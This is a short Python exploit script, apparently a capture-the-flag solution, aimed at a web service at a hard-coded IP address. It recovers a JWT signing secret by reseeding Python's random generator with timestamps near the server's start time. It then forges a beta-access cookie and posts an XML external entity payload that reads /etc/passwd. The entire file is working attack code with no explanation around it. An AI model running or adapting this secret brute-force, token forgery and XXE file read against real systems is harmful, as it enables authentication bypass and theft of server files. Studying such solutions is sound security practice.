import datetime as dt
from uuid import uuid4
import requests as reqs
import string
import random

import jwt

url = "http://194.26.138.228:5000/pretty_xml"

stats_time = "19:05:54 26.10.23"
run_time = 3

s_datetime = dt.datetime.strptime(stats_time, "%H:%M:%S %d.%m.%y").replace(tzinfo=dt.timezone.utc).timestamp()
start_timestamp = int(s_datetime) - int(run_time)

for i in range(10):
    random.seed(start_timestamp)
    secret = ''.join(
        [random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for i in range(32)]
    )

    token = jwt.encode({"uid": str(uuid4()), "is_beta": True}, secret, algorithm="HS256")
    cookies = {
        "bc": token
    }

    resp = reqs.get(url, cookies=cookies)
    if "beta" not in resp.text:
        print("START_TIMESTAMP:", start_timestamp)
        print("SECRET:", secret)
        print("TOKEN:", token)
        break

    start_timestamp -= 1

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]><foo>&xxe;</foo>
"""

resp = reqs.post(url, cookies=cookies, data={
    "ugly_data": xxe_payload
})

print(resp.text)
